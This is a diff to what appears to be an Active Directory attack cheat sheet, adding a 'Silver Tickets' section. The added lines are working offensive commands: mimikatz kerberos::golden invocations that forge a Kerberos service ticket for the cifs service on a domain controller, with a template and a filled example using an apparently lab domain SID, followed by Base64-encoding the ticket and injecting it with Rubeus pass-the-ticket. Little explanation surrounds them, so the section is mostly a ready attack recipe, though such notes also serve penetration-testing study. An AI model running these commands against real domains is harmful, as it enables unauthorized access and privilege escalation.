@@ -34,3 +34,15 @@ kerberos::golden /user:Administrator /domain:cyberbotic.io /sid:S-1-5-21-3865823
 execute-assembly C:\Users\Public\Rubeus.exe ptt /ticket:
 
 ```
+### Silver Tickets
+```
+powershell [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+kerberos::golden /user:<> /domain:<> /sid:<> /target:<> /service:<> /rc4:<> /ticket:silver.kirbi
+kerberos::golden /user:Administrator /domain:Insomnia.io /sid:S-1-5-21-3865823697-1816233505-1834004910 /target:dc-1.cyberbotic.io /service:cifs /rc4: /ticket:silver.kirbi
+
+[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\Commando\Desktop\Mimikatz_x64\silver.kirbi"))
+
+execute-assembly C:\Users\Public\Rubeus.exe ptt /ticket:
+
+
+```
